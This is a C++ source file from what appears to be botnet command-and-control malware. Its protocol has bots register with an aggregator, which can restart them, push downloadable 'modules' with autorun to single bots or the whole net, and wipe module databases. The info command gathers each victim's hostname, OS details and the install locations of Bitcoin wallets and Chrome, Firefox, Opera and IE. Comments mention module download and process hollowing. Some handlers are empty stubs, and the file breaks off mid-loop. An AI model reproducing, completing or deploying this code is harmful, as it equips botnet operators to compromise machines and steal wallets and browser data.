#include <Windows.h>
#include <vector>

#include "bot_protocol.h"

#include "api.h"
#include "common/mem.h"
#include "common/str.h"
#include "core/info.h"
#include "core/core.h"
#include "crypt/crypt.h"
#include "inject/spawn.h"
#include "http/url.h"
//#include "http/downloader.h"
#include "debug/stdin.h"

#include "../../_build/aggregator/aggregator/db_sync.h"

using namespace bot_protocol;

static PCRITICAL_SECTION active_instance_sync;
//std::vector<bot_protocol::instance *> active_instances;

VOID bot_protocol::init(VOID)
{
	bot_protocol::_sig_hello_size = str::lenA(bot_protocol::_sig_hello);
	bot_protocol::_sig_hello_end_size = str::lenA(bot_protocol::_sig_hello_end);

	// Sync
	active_instance_sync = (PCRITICAL_SECTION)mem::malloc(sizeof(CRITICAL_SECTION));
	cInitializeCriticalSection(active_instance_sync);

}

// If exists, return true
bool bot_protocol::check_if_instance_exists(__in bot_protocol::instance& current_instance,
											__in const std::vector<bot_protocol::instance *>& active_instances)
{
	ACTIVE_INSTANCE_SYNC(active_instance_sync);

	DWORD current_id = current_instance.get_bot_id_dword();
	if (current_id == 0) {
		ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
		DebugBreak();
	}

	if (active_instances.size() == 0) {
		ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
		return false;
	}

	for (std::vector<bot_protocol::instance *>::const_iterator i = active_instances.begin(); 
		i != active_instances.end(); i++) {

		if (current_id == (*i)->get_bot_id_dword()) {
			ACTIVE_INSTANCE_UNSYNC(active_instance_sync);

			return true;
		}
	}

	ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	
	return false;
}

void bot_protocol::add_to_instance_list(__in bot_protocol::instance& current_instance,
										__inout std::vector<bot_protocol::instance *>& active_instances)
{
	ACTIVE_INSTANCE_SYNC(active_instance_sync);

	active_instances.push_back(&current_instance);

	ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	return;
}

void bot_protocol::remove_from_instance_list(__in bot_protocol::instance& current_instance,
											 __inout std::vector<bot_protocol::instance *>& active_instances)
											// __inout std::vector<bot_protocol::instance *>& current_instances)
{
	ACTIVE_INSTANCE_SYNC(active_instance_sync);

	//const std::vector<bot_protocol::instance *> *tmp_inst = &active_instances;
	//const std::vector<bot_protocol::instance *>::const_iterator i = tmp_inst->begin();

	if (active_instances.size() == 0) {
		ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
		return;
	} else if (active_instances.size() == 1) {
		active_instances.clear();

		ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
		return;
	}


	for (std::vector<bot_protocol::instance *>::iterator i = active_instances.begin();
		i != active_instances.end(); 
		i++) 

	//while (i != tmp_inst->end())
	{
		if (*i == &current_instance) {

			active_instances.erase(i);

			ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
			return;
		}
	}

	ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	return;
}

// Expects parent to by synchronized
bot_protocol::instance *bot_protocol::find_instance(__in id_info::id& current_id,
													__in const std::vector<bot_protocol::instance *>& active_instances)
{
	DWORD id = current_id.get_dword();
	if (id == 0) {
		ACTIVE_INSTANCE_SYNC(active_instance_sync);
		return NULL;
	}

	for (std::vector<instance *>::const_iterator i = active_instances.begin(); i != active_instances.end(); i++) {
		if ((*i)->get_bot_id_dword() == id) {
			// ID Found
			ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
			return *i;
		}
	}

	ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	return NULL;
}

bool bot_protocol::parse_boolean_string(__in const LPSTR input)
{
	if (!str::compareA(input,bot_protocol::_boolean_true, bot_protocol::_boolean_true_size)) {
		return true;
	} else {
		return false;
	}
}

proto_hello::PTOTAL_BUFFER_SIZE proto_hello::construct_buffer(
	__inout const proto_hello::PDATA *data_info,
	__in const str_string& hostname, 
	__in const id_info::id& host_id)
{

	this->hello_data			= new data();
	hello_data->hostname		= str::lenA(bot_protocol::_sig_hello) + sizeof(DATA);
	hello_data->hostname_size	= LocalHostName->lenA() + str::ASCII_CHAR;

	hello_data->id				= hello_data->hostname + hello_data->hostname_size;
	hello_data->id_size			= id_info::number_of_elements;

	hello_data->ok				= hello_data->id + hello_data->id_size;
	hello_data->ok_size			= str::lenA(bot_protocol::_sig_hello_end);

	proto_hello::PTOTAL_BUFFER_SIZE complete_buffer = new proto_hello::total_buffer_size();
	complete_buffer->raw_buffer_size = str::lenA(bot_protocol::_sig_hello) + 
		sizeof(proto_hello::data) + hello_data->hostname_size + hello_data->id_size + hello_data->ok_size;
	LPBYTE raw_buffer = (LPBYTE)mem::malloc(complete_buffer->raw_buffer_size);
	mem::copy(raw_buffer, bot_protocol::_sig_hello, str::lenA(bot_protocol::_sig_hello));
	mem::copy(&raw_buffer[str::lenA(bot_protocol::_sig_hello)], this->hello_data, sizeof(DATA));
	mem::copy(&raw_buffer[hello_data->hostname], LocalHostName->to_lpstr(), LocalHostName->lenA());
	
	// Write out ID
	PBYTE ptr = (PBYTE)&raw_buffer[hello_data->id];
	for (UINT i = 0; i < id_info::number_of_elements; i++, ptr++) {
		*ptr = host_id.get_byte_at_offset(i);
	}

	// Write out OK
	mem::copy(&raw_buffer[hello_data->ok], bot_protocol::_sig_hello_end, hello_data->ok_size);
	complete_buffer->raw_buffer = raw_buffer;

	return complete_buffer;
}

proto_hello::PDATA proto_hello::parse_buffer(
	__in const socket_tools::data& raw_data,
	__inout str_string** hostname, 
	__inout id_info::id** host_id)
{
	*hostname = NULL;
	*host_id  = NULL;

	LPBYTE buffer;
	UINT buffer_size;
	raw_data.get_buffer((LPVOID *)&buffer, &buffer_size);
	if (buffer == NULL || buffer_size == 0 || buffer_size <= (bot_protocol::_sig_hello_size +
		sizeof(bot_protocol::proto_hello::DATA) + bot_protocol::_sig_hello_end_size)) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Invalid Greeting.\n");
#endif
		return NULL;
	}

	// Check _sig_hello
	if (str::compareA((LPCSTR)buffer, bot_protocol::_sig_hello, bot_protocol::_sig_hello_size)) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Invalid HELLO value.\n");
#endif
		return NULL;
	}

	bot_protocol::proto_hello::PDATA hello_data_structure = 
		(bot_protocol::proto_hello::PDATA)mem::malloc(sizeof(bot_protocol::proto_hello::DATA));
	mem::copy((LPVOID)hello_data_structure, (LPCVOID)&buffer[bot_protocol::_sig_hello_size], 
		sizeof(bot_protocol::proto_hello::DATA));
	
	// Check relative offsets
	if ((bot_protocol::_sig_hello_size + sizeof(bot_protocol::proto_hello::DATA) + hello_data_structure->hostname_size +
		hello_data_structure->id_size + hello_data_structure->ok_size) != buffer_size) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Incorrect greeting buffer size\n");
#endif
		mem::free(hello_data_structure);
		return NULL;
	}

	// Parse identifier
	if (hello_data_structure->id_size != id_info::number_of_elements) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Invalid ID length\n");
#endif
		mem::free(hello_data_structure);
		return NULL;
	}
	Ptr<std::vector<BYTE>> IdArray = new std::vector<BYTE>;
	PBYTE raw_id_byte_ptr = (PBYTE)&buffer[hello_data_structure->id]; 
	for (UINT i = 0; i < hello_data_structure->id_size; i++, raw_id_byte_ptr++) {
		IdArray->push_back(*raw_id_byte_ptr);
	}
	*host_id = new id_info::id(*IdArray);

	// Parse hostname
	if (!str::is_charA((LPCSTR)&buffer[hello_data_structure->hostname], 
		hello_data_structure->hostname_size - str::ASCII_CHAR)) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Invalid hostname\n");
#endif
		mem::free(hello_data_structure);
		return NULL;
	}
	*hostname = new str_string((LPSTR)&buffer[hello_data_structure->hostname]);

	return hello_data_structure;
}

// Command handlers ///////////////////////////////////////////////////////////
// These are processed by the aggregator terminal
bool bot_protocol::handler_test_info(__in const text_io::input& raw_input,
									__inout std::vector<bot_protocol::instance *>& active_instances)
{
	UINT sig_size = str::lenA(bot_protocol::_sig_info);

	if (raw_input.get_raw_size() < sig_size) {
		return false;
	}

	if (str::compareA(raw_input.get_raw_input(), bot_protocol::_sig_info, sig_size)) {
		return false;
	}

	return true;
}

bool bot_protocol::handler_info(__in const text_io::input& raw_input,
								__inout std::vector<bot_protocol::instance *>& active_instances)
{
	str_string *raw_string = raw_input.get_string();
	Ptr<std::vector<LPSTR>> RawTokens = raw_string->split_string_by_terminatorA(NULL, command_split_token, str::ASCII_CHAR);
	if (RawTokens->size() != bot_protocol::_sig_info_params) {
		return false;
	}
	//if (RawTokens->size() != bot_protocol::_sig_module_bin_params) {
	//	return false;
	//}

	// Determine target
	

	// Either we target a specific bot, or we target all bots (ANY keyword/ID keyword)

	return true;
}

bool bot_protocol::handler_test_restart(__in const text_io::input& raw_data,
										__inout std::vector<bot_protocol::instance *>& active_instances)
{
	UINT sig_size = str::lenA(bot_protocol::_sig_restart);

	if (raw_data.get_raw_size() < sig_size) {
		return false;
	}

	if (str::compareA(raw_data.get_raw_input(), bot_protocol::_sig_restart, sig_size)) {
		return false;
	}

	return true;
}

bool bot_protocol::handler_restart(__in const text_io::input& raw_data,
								   __inout std::vector<bot_protocol::instance *>& active_instances)
{
	str_string *raw_string = raw_data.get_string();
	Ptr<std::vector<LPSTR>> RawTokens = raw_string->split_string_by_terminatorA(NULL, command_split_token, str::ASCII_CHAR);
	if (RawTokens->size() != bot_protocol::_restart_number_of_elements) {
		return false;
	}

	if (str::compareA((*RawTokens)[bot_protocol::_ref_operand_target], 
		bot_protocol::_sig_all, bot_protocol::_sig_all_length) == false) 
	{
		// Restart entire net. 
		ACTIVE_INSTANCE_SYNC(active_instance_sync);
		for (std::vector<instance *>::iterator i = active_instances.begin(); i != active_instances.end(); i++) {
			(*i)->restart_connection();
			active_instances.erase(i);

			if (active_instances.size() == 0) {
				break;
			}

			i = active_instances.begin();
		}

		ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	} else {
		// Restart only one client
		ACTIVE_INSTANCE_SYNC(active_instance_sync);

		Ptr<id_info::id> CurrentId = new id_info::id((*RawTokens)[bot_protocol::_ref_operand_target]);
		bot_protocol::instance *current_instance = bot_protocol::find_instance(*CurrentId, active_instances);
		if (current_instance == NULL) {
#ifdef DEBUG_OUT
			printf("[!] Unknown BotId\n");
#endif
		}

		// Find it in the list
		for (std::vector<instance *>::iterator i = active_instances.begin(); 
			i != active_instances.end(); i++) {

			if (current_instance == *i) {
				(*i)->restart_connection();
				active_instances.erase(i);
				break;
			}
		}

		ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	}

	return true;
}

// Command type: DL ALL/ID NAME [local file name] [autorun:true/false] [sync:true/false]
bool bot_protocol::handler_test_dl(__in const text_io::input& raw_data,
								   __inout std::vector<bot_protocol::instance *>& active_instances)
{
	str_string *raw_string = raw_data.get_string();
	Ptr<std::vector<LPSTR>> RawTokens = raw_string->split_string_by_terminatorA(NULL, command_split_token, str::ASCII_CHAR);

	if (RawTokens->size() != bot_protocol::_sig_dl_params) {
		return false;
	}

	if (!str::compareA((*RawTokens)[PROTO_BIN_MODULE_PARAMETER_NAME],
		bot_protocol::_sig_dl, bot_protocol::_sig_dl_size))	
	{
		return false;
	}
	 
	return true;
}

bool bot_protocol::handler_dl(__in const text_io::input& raw_data,
							  __inout std::vector<bot_protocol::instance *>& active_instances)
{
	str_string *raw_string = raw_data.get_string();
	Ptr<std::vector<LPSTR>> RawTokens = raw_string->split_string_by_terminatorA(NULL, 
		bot_protocol::command_split_token, 
		str::ASCII_CHAR);
	if (RawTokens->size() != bot_protocol::_sig_dl_params) {
		return false;
	}

	if (str::compareA((*RawTokens)[PROTO_BIN_MODULE_PARAMETER_SIG], bot_protocol::_sig_all, 
		bot_protocol::_sig_all_length)) 
	{		
		return false;
	}

	bool autorun = bot_protocol::parse_boolean_string((*RawTokens)[PROTO_BIN_MODULE_PARAMETER_AUTORUN]);
	bool sync = bot_protocol::parse_boolean_string((*RawTokens)[PROTO_BIN_MODULE_PARAMETER_SYNC]);
	
	Ptr<bot_protocol::proto_dl> ProtoDL = new proto_dl((*RawTokens)[PROTO_BIN_MODULE_PARAMETER_NAME],
		autorun, sync);

	return true;
}

	// Add module command through http download (on client side) - generally unsafe
bool bot_protocol::handler_test_module(__in const text_io::input& raw_data,
									   __inout std::vector<bot_protocol::instance *>& active_instances)
{
	UINT sig_size = str::lenA(bot_protocol::_sig_add_module);

	if (raw_data.get_raw_size() < sig_size) {
		return false;
	}

	if (str::compareA(raw_data.get_raw_input(), bot_protocol::_sig_add_module, sig_size)) {
		return false;
	}	

	return true;
}

DWORD bot_protocol::instance::get_sync_id_number(types::DEFAULT_NO_PARAMETERS) const
{
	

	
	return 0;
}

bool bot_protocol::instance::process_sync(void)
{
	this->Sync = new bot_protocol::proto_sync_agg(*this->CommSocket);

	bool sync_status = this->Sync->get_is_sync_ok();
	
	return sync_status;
}

bool bot_protocol::instance::process_info(void)
{
	// Generate request
	Ptr<proto_info::info_request> InfoRequest = new proto_info::info_request();
	Buffer2 RawBuffer = new mem::buffer2(sizeof(proto_info::info_request));
	mem::copy(**RawBuffer, InfoRequest.get_value(), sizeof(proto_info::info_request));
	bool send_status = this->CommSocket->send_data(*RawBuffer);
	if (send_status == false) {
		return false;
	}

	// Listen for response
	this->Info = new proto_info_agg(*this->CommSocket);
	bool process_status = this->Info->process(NULL);
	if (process_status == false) {
		return false;
	}

	return true;
}

bool instance::command_cleardb(__in const socket_tools::socket_data& active_socket,
							   __in const id_info::id& instance_id) const
{
	Ptr<bot_protocol::proto_cleardb> ClearDB = new bot_protocol::proto_cleardb_agg(active_socket,
		instance_id);
	ClearDB->process(); // Send out signal

	return true;
}

bool bot_protocol::handler_module(__in const text_io::input& raw_data,
								  __inout std::vector<bot_protocol::instance *>& active_instances)
{
	// AM [all/bot] [name] [url] [autorun:true/false] [sync:true/false]
	// 5 parameters total

	// Add to sync_db
#ifndef _CONFIG_SYNC_DB_DISABLE
	bool add_status = db_sync::add_to_database(raw_data);
	if (add_status == false) {
		return false;
	}
#endif

	StrString RawString = new str_string(raw_data.get_raw_input());
	Ptr<std::vector<LPSTR>> RawTokens = RawString->split_string_by_terminatorA(NULL, 
		command_split_token, str::ASCII_CHAR);
	if (RawTokens->size() != bot_protocol::_add_module_number_of_elements) {
		return false;
	}

	if (str::compareA((*RawTokens)[bot_protocol::_ref_operand_target], 
		bot_protocol::_sig_all, bot_protocol::_sig_all_length) == false) {

			// Add module to entire net
			ACTIVE_INSTANCE_SYNC(active_instance_sync);

#ifdef DEBUG_OUT
			DBGOUT("[+] Adding module %s to entire net.\n", (*RawTokens)[bot_protocol::_ref_module_name]);
#endif

			for (std::vector<instance *>::iterator i = active_instances.begin(); 
				i != active_instances.end(); i++) {

				bool add_module_status = (*i)->add_module(raw_data);
				if (add_module_status == false) {
#ifdef DEBUG_OUT
					DBGOUT("[!] Failed to add module (protocol error) on ID: %s. (Bot down?)\n", (*i)->get_bot_id_raw()->to_lpstr());
#endif

				}
				
			}

			ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	} else {
		// Add module to specific bot, no sync needed
		ACTIVE_INSTANCE_SYNC(active_instance_sync);
		Ptr<id_info::id> CurrentId = new id_info::id((*RawTokens)[bot_protocol::_ref_operand_target]);
		bot_protocol::instance *current_instance = bot_protocol::find_instance(*CurrentId, active_instances);
		if (current_instance == NULL) {
#ifdef DEBUG_OUT
			DBGOUT("[!] Unknown BotId\n");
#endif
			return false;
		}

		for (std::vector<instance *>::iterator i = active_instances.begin(); 
			i != active_instances.end(); i++) {

			if (current_instance == *i) {
				(*i)->add_module(raw_data);
				break;
			}
		}

		ACTIVE_INSTANCE_UNSYNC(active_instance_sync);
	}

	return true;
}

// ClearDB command
bool bot_protocol::handler_test_cleardb(__in const text_io::input& raw_data,
										__inout std::vector<bot_protocol::instance *>& active_instances)
{
	StrString RawString = new str_string(raw_data.get_raw_input());
	Ptr<std::vector<LPSTR>> RawTokens = RawString->split_string_by_terminatorA(NULL, 
		command_split_token, str::ASCII_CHAR);
	if (str::lenA((*RawTokens)[0]) < sizeof(_sig_cleardb_list)) {
		return false;
	}

	if (RawTokens->size() != bot_protocol::_cleardb_number_of_elements) {
		return false;
	}

	return true;
}

bool bot_protocol::handler_cleardb(__in const text_io::input& raw_data,
								   __inout std::vector<bot_protocol::instance *>& active_instances)
{
	StrString RawString = new str_string(raw_data.get_raw_input());
	Ptr<std::vector<LPSTR>> RawTokens = RawString->split_string_by_terminatorA(NULL,
		command_split_token, str::ASCII_CHAR);

	db_sync::get_sync_database()->shred_sync_database();
	
	if (str::compareA((*RawTokens)[1], bot_protocol::_sig_all, str::lenA(bot_protocol::_sig_all)) == false) {
		// Entire network
#ifdef DEBUG_OUT
		printf("[+] Flushing all module databases in net\n");
#endif

		for (std::vector<instance *>::iterator i = active_instances.begin();
			i != active_instances.end(); i++)
		{ 
			(*i)->command_cleardb((*i)->get_comm_socket__(), (*i)->get_bot_id_());
		}

	} else {
		// Specific bot
		DebugBreak();
	}	   											 

	return true;
}

bool bot_protocol::process_cleardb(__in const socket_tools::data& raw_data,
								   __in const id_info::id& id)
{
	Ptr<bot_protocol::proto_cleardb> ClearDB = new proto_cleardb_bot(raw_data, id);
	ClearDB->process();

#ifdef DEBUG_OUT
		DBGOUT("[+] Flushed db. All modules halted. Exiting...\n");
#endif

	return true;
}

// Bot Command Processor //////////////////////////////////////////////////////
// Performs primary bot<->aggregator command parsing
bool bot_protocol::process_data(__in const socket_tools::data& inbound_data, __in const id_info::id& id)
{

	LPVOID buffer;
	UINT buffer_size;
	inbound_data.get_buffer(&buffer, &buffer_size);
	
	for (UINT i = 0; i < bot_protocol::number_of_commands; i++) {
		UINT sig_length = str::lenA(command_processor_list[i].signature);

		if (buffer_size < sig_length) {
			continue;
		}

		if (!str::compareA((LPCSTR)buffer, command_processor_list[i].signature, sig_length)) {
			bool processor_status = command_processor_list[i].processor_handler(inbound_data, id);
			if (processor_status == false) {
				// Invalid command. This should never happen
				return false;
			}
			return true;
		}
	}

	return false;
}

bool bot_protocol::process_info(__in const socket_tools::data& inbound_data, 
								__in const id_info::id& id)
{



	return true;
}

bool bot_protocol::process_download_execute(__in const socket_tools::data& inbound_data,
											__in const id_info::id& id)
{
	return true;
}

bool bot_protocol::process_add_module(__in const socket_tools::data& inbound_data,
									  __in const id_info::id& id)
{
	// Create proto_add_module class; parse

	Ptr<bot_protocol::proto_add_module> CurrentModule = new proto_add_module(inbound_data);

	// Download Module
	

	// Load into storage

	// Hollow

	return true;
}

bool bot_protocol::process_open_terminal(__in const socket_tools::data& inbound_data,
										 __in const id_info::id& id)
{

	return true;
}

bool bot_protocol::process_dl(__in const socket_tools::data& inbound_data,
							  __in const id_info::id& id)
{

	return true;
}

bool bot_protocol::process_restart(__in const socket_tools::data& inbound_data,
								   __in const id_info::id& id)
{

	DebugBreak();

	return true;
}

/*--------[Command: Info]-------------------------------------------------------------------*/
bot_protocol::proto_info_client::proto_info_client(__in const mem::buffer2& raw_data, 
												   __in const socket_tools::socket_data& current_connection)
{
	this->current_info_data = NULL;
	this->current_connection = const_cast<socket_tools::socket_data *>(&current_connection);
	this->ServerRequest = new mem::buffer2(*raw_data, raw_data.get_raw_size());
}

bot_protocol::proto_info_agg::proto_info_agg(__in const socket_tools::socket_data& current_connection) 
{
	this->current_info_data = NULL;
	this->current_connection = const_cast<socket_tools::socket_data *>(&current_connection);

	this->RawSendData = new mem::buffer2(sizeof(info_request));
	PINFO_REQUEST request = (PINFO_REQUEST)**this->RawSendData;
	request->signature_length = bot_protocol::_sig_info_len;
	mem::copy((LPVOID)request->signature, bot_protocol::_sig_info, request->signature_length); 

	this->InfoData = NULL;
}

bool proto_info_client::process(__inopt const client_info::info *data)
{
	// Check if the response is nominal
	if (this->ServerRequest->get_raw_size() != sizeof(INFO_REQUEST)) {
		return false;
	}

	PINFO_REQUEST request_header = (PINFO_REQUEST)**this->ServerRequest;
	if (request_header->signature_length != bot_protocol::_sig_info_len) {
		return false;
	}

	// Generate info structure
	info_data *current_info = new info_data();
	client_info::info::raw_info *current_data = data->get_data();
	
	mem::copy(&current_info->hostname, data->get_data()->hostname, data->get_data()->hostname_len);
	current_info->hostname_size = data->get_data()->hostname_len;

	current_info->is_bitcoin		= current_data->is_bitcoin;
	current_info->is_chrome			= current_data->is_chrome;
	current_info->is_opera			= current_data->is_opera;
	current_info->is_firefox		= current_data->is_firefox;
	current_info->is_ie				= current_data->is_ie;
	current_info->is_user			= FALSE;

	if (current_data->bitcoin_loc[0] != '\0') 
		mem::copy(&current_info->bitcoin_loc, current_data->bitcoin_loc, str::lenA(current_data->bitcoin_loc));
	if (current_data->chrome_loc[0] != '\0')
		mem::copy(&current_info->chrome_loc, current_data->chrome_loc, str::lenA(current_data->chrome_loc));
	if (current_data->opera_loc[0] != '\0')
		mem::copy(&current_info->opera_loc, current_data->opera_loc, str::lenA(current_data->opera_loc));
	if (current_data->firefox_loc[0] != '\0')
		mem::copy(&current_info->firefox_loc, current_data->firefox_loc, str::lenA(current_data->firefox_loc));
	if (current_data->ie_loc[0] != '\0')
		mem::copy(&current_info->ie_loc, current_data->ie_loc, str::lenA(current_data->ie_loc));

	mem::copy(&current_info->sys_info, &current_data->sys_info, sizeof(SYSTEM_INFO));
	mem::copy(&current_info->os_info, &current_data->os_info, sizeof(OSVERSIONINFOA));

	// Send response
	Buffer2 SendBuffer = new mem::buffer2(sizeof(info_data));
	mem::copy(**SendBuffer, current_info, sizeof(info_data));
	delete current_info;
	bool send_status = this->current_connection->send_data(*SendBuffer);
	if (send_status == false) {
		return false;
	}																   

	return true;
}

bool proto_info_agg::process(__inopt const client_info::info *data)
{
	// Send the request
	bool tx_status = this->current_connection->send_data(*this->RawSendData);
	if (tx_status == false) {
		return false;
	}

	// Receive response
	socket_tools::socket_data::WAIT_ERROR wait_status = 
		this->current_connection->wait_for_data(bot_protocol::timeout_hello_s, bot_protocol::timeout_hello_ms);
	if (wait_status != socket_tools::socket_data::WAIT_ERROR_DATA_AVAILABLE) {
		return false;
	}

	socket_tools::data *raw_response = this->current_connection->wait_for_data_get_data(NULL, NULL);

	if (raw_response->get_size() != sizeof(info_data)) {
		return false;
	}

	info_data *raw_info = (info_data *)raw_response->get_buffer()->get_raw_buffer();
	if ((raw_info->hostname_size > MAX_COMPUTERNAME_LENGTH) || 
		(raw_info->hostname[MAX_PATH] != '\0') ||
		(raw_info->bitcoin_loc[MAX_PATH] != '\0') ||
		(raw_info->chrome_loc[MAX_PATH] != '\0') ||
		(raw_info->opera_loc[MAX_PATH] != '\0') ||
		(raw_info->firefox_loc[MAX_PATH] != '\0') ||
		(raw_info->ie_loc[MAX_PATH] != '\0') ||
		(str::is_charA(raw_info->hostname, str::lenA(raw_info->hostname)) == false)) 
	{
		return false;
	}

	// Check the bools
	/*
	if ((raw_info->is_bitcoin > 1) ||
		(raw_info->is_chrome > 1) ||
		(raw_info->is_firefox > 1) ||
		(raw_info->is_ie > 1) ||
		(raw_info->is_opera > 1) ||
		(raw_info->is_user > 1))
	{
		return false;
	}
	*/

	// Check architecture
	switch (raw_info->sys_info.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64:
	case PROCESSOR_ARCHITECTURE_INTEL:
		break;

	default:
		return false;
	}

	this->InfoData = new info_data();

	mem::copy(this->InfoData->hostname, raw_info->hostname, str::lenA(raw_info->hostname));
	this->InfoData->hostname_size = raw_info->hostname_size;

	if (raw_info->is_bitcoin == true) {
		if (str::is_charA(raw_info->bitcoin_loc, str::lenA(raw_info->bitcoin_loc)) == false) {
			return false;
		}

		mem::copy(this->InfoData->bitcoin_loc, raw_info->bitcoin_loc, str::lenA(raw_info->bitcoin_loc));
	}

	if (raw_info->is_chrome == true) {
		if (str::is_charA(raw_info->chrome_loc, str::lenA(raw_info->chrome_loc)) == false) {
			return false;
		}

		mem::copy(this->InfoData->chrome_loc, raw_info->chrome_loc, str::lenA(raw_info->chrome_loc));
	}

	if (raw_info->is_opera == true) {
		if (str::is_charA(raw_info->opera_loc, str::lenA(raw_info->opera_loc)) == false) {
			return false;
		}

		mem::copy(this->InfoData->opera_loc, raw_info->opera_loc, str::lenA(raw_info->opera_loc));
	}

	if (raw_info->is_firefox == true) {
		if (str::is_charA(raw_info->firefox_loc, str::lenA(raw_info->firefox_loc)) == false) {
			return false;
		}

		mem::copy(this->InfoData->firefox_loc, raw_info->firefox_loc, str::lenA(raw_info->firefox_loc));
	}

	if (raw_info->is_ie == true) {
		if (str::is_charA(raw_info->ie_loc, str::lenA(raw_info->ie_loc)) == false) {
			return false;
		}

		mem::copy(this->InfoData->ie_loc, raw_info->ie_loc, str::lenA(raw_info->ie_loc));
	}

	mem::copy(&this->InfoData->os_info, &raw_info->os_info, sizeof(OSVERSIONINFOA));
	mem::copy(&this->InfoData->sys_info, &raw_info->version_data, sizeof(SYSTEM_INFO));
	
	InfoData->is_bitcoin	= raw_info->is_bitcoin;
	InfoData->is_chrome		= raw_info->is_chrome;
	InfoData->is_opera		= raw_info->is_opera;
	InfoData->is_firefox	= raw_info->is_firefox;
	InfoData->is_ie			= raw_info->is_ie;
	InfoData->is_user		= raw_info->is_user;

	return true;
}

/*--------[Command: Hello]------------------------------------------------------------------*/
bool bot_protocol::proto_hello::verify_response(__in const socket_tools::data& raw_data)
{
	LPVOID buffer;
	UINT buffer_size;

	UINT _sig_hello_response_size = str::lenA(_sig_hello_response);

	raw_data.get_buffer(&buffer, &buffer_size);
	if (buffer_size < _sig_hello_response_size || 
		str::compareA((LPCSTR)buffer, bot_protocol::_sig_hello_response,
		_sig_hello_response_size)) 
	{

		return false;
	}

	return true;
}

bool bot_protocol::proto_hello::send_response(VOID) const
{
	UINT _sig_hello_response_size = str::lenA(_sig_hello_response);

	LPBYTE response_buffer = (LPBYTE)mem::malloc(_sig_hello_response_size + str::ASCII_CHAR);
	mem::copy(response_buffer, bot_protocol::_sig_hello_response,
		_sig_hello_response_size);

	Buffer2 SendBuffer = new mem::buffer2(response_buffer, _sig_hello_response_size);
	bool send_status = this->comm_socket->send_data(*SendBuffer);
	if (send_status == false) {
		mem::free(response_buffer);
		return false;
	}

	/*
	INT send_status = send(this->comm_socket->get_socket(), (const char *)response_buffer,
		str::lenA((LPCSTR)response_buffer), 0);
	if (send_status != str::lenA((LPCSTR)response_buffer)) {
		mem::free(response_buffer);
		return false;
	}
	*/

	mem::free(response_buffer);
	return true;
}

bool bot_protocol::proto_hello::send_command(NO_PARAMETERS) const
{
	if (this->buffer_total == NULL || this->comm_socket->get_socket() == INVALID_SOCKET) {
		return false;
	}

	Buffer2 SendData = new mem::buffer2(this->buffer_total->raw_buffer, 
		this->buffer_total->raw_buffer_size);
	bool send_status = this->comm_socket->send_data(*SendData);
	if (send_status == false) {
		return false;
	}

	/*
	INT send_status = send(this->comm_socket->get_socket(), 
		(const char *)this->buffer_total->raw_buffer, this->buffer_total->raw_buffer_size, 0);
	if (send_status != this->buffer_total->raw_buffer_size) {
		return false;
	}
	*/
			
	return true;
}

/*--------[Command: Sync]-------------------------------------------------------------------*/
proto_sync_bot::proto_sync_bot(__in const socket_tools::socket_data *active_socket,
							   __in const id_info::id *current_id)
{
	this->raw_sync_objects = NULL;

	// Build request structure
	this->RequestHeader = new request_header();
	this->RequestHeader->bot_id = const_cast<id_info::id *>(current_id)->get_dword();

	this->current_connection = const_cast<socket_tools::socket_data *>(active_socket);
	
	return;
}

proto_sync_agg::proto_sync_agg(__in const socket_tools::socket_data& active_socket)
{
	this->is_sync_ok = false;

	// Read in data
	const_cast<socket_tools::socket_data&>(active_socket).wait_for_data(
		bot_protocol::sync_db_cmd_timeout_s, 
		bot_protocol::sync_db_cmd_timeout_ms);

	socket_tools::data *raw_request_data = 
		const_cast<socket_tools::socket_data&>(active_socket).wait_for_data_get_data(
		NULL, NULL);

	mem::buffer2 *raw_request_buffer = raw_request_data->get_buffer();

	if (raw_request_buffer->get_raw_size() < sizeof(request_header)) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Invalid sync command request!\n");
#endif
		return;
	}

	// Ask for sync identifiers
	db_sync::sync_database *current_database = db_sync::get_sync_database();
	std::vector<proto_sync::raw_sync_element *> *current_elements = 
		current_database->get_sync_elements();
	if (current_elements == NULL) {
#ifdef DEBUG_OUT
		DBGOUT("[!] Invalid sync elements returned from sync database!\n");
#endif
		return;		
	}
	this->raw_sync_objects = current_elements;

	// Check if there are no sync objects
	if (current_elements->size() == 0) {
		// No sync objects - only send back a header with 0 syncs
		Buffer2 ResponseBuffer = new mem::buffer2(sizeof(raw_header));
		mem::copy(((raw_header *)(**ResponseBuffer))->signature, _sig_sync, sizeof(_sig_sync));
		//Ptr<raw_header> RawHeader = new raw_header();
		//Buffer2 ResponseBuffer = new mem::buffer2(sizeof(raw_header));
		//mem::copy(**ResponseBuffer, (LPCVOID)RawHeader.get_value(), sizeof(raw_header));
		bool send_status = active_socket.send_data(*ResponseBuffer);
		if (send_status == false) {
#ifdef DEBUG_OUT
			DBGOUT("[!] Failed to send sync 0 header response.\n");
#endif
			return;
		}

		this->is_sync_ok = true;

		return;
	}

	// Construct response buffer header
	Buffer2 ResponseBuffer = new mem::buffer2(
		sizeof(raw_header) + ((sizeof(raw_sync_element) * this->raw_sync_objects->size())));
	Ptr<raw_header> RawHeader = new raw_header();
	RawHeader->number_of_syncs = this->raw_sync_objects->size();
	mem::copy(**ResponseBuffer, RawHeader.get_value(), sizeof(raw_header));
	RawHeader = NULL;

	// Construct response buffer elements
	PRAW_SYNC_ELEMENT current_raw_element = 
		(PRAW_SYNC_ELEMENT)((DWORD_PTR)ResponseBuffer->get_raw_buffer() + sizeof(raw_header));

	for (std::vector<raw_sync_element *>::iterator i = this->raw_sync_objects->begin();
